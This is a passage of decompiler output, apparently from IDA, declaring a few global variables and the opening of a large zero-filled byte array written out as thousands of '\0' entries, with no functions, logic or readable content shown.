}; // idb
_UNKNOWN unk_413198; // weak
CHAR byte_4131A0[44] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
int dword_4131CC = 0; // weak
char byte_4131D0[524288] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
